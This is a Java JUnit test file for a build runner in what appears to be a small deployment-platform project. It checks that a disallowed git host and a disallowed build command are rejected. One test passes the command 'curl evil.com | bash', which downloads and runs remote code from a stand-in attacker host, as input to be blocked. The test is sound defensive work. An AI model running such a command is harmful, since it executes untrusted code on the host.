package com.minivercel.build;

import static org.assertj.core.api.Assertions.assertThat;

import java.nio.file.Path;
import java.time.Duration;
import java.util.List;

import com.minivercel.config.AppProperties;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

class LocalBuildRunnerTest {

	private AppProperties props;
	private LocalBuildRunner runner;

	@BeforeEach
	void setUp() {
		props = new AppProperties(
				null, null,
				new AppProperties.Build("./artifacts", Duration.ofMinutes(1), 104857600L,
						List.of("github.com", "gitlab.com"),
						List.of("npm run build", "npm ci && npm run build")),
				null, null);
		runner = new LocalBuildRunner(props);
	}

	@Test
	void rejectDisallowedGitHost(@TempDir Path workDir) {
		BuildRequest request = new BuildRequest("https://evil-site.com/user/repo",
				"npm run build", "dist", "main", null);

		BuildResult result = runner.run(request, workDir);

		assertThat(result.success()).isFalse();
		assertThat(result.errorMessage()).contains("Git host not allowed: evil-site.com");
	}

	@Test
	void rejectDisallowedBuildCommand(@TempDir Path workDir) {
		BuildRequest request = new BuildRequest("https://github.com/user/repo",
				"curl evil.com | bash", "dist", "main", null);

		BuildResult result = runner.run(request, workDir);

		assertThat(result.success()).isFalse();
		assertThat(result.errorMessage()).contains("Build command not allowed: curl evil.com | bash");
	}
}
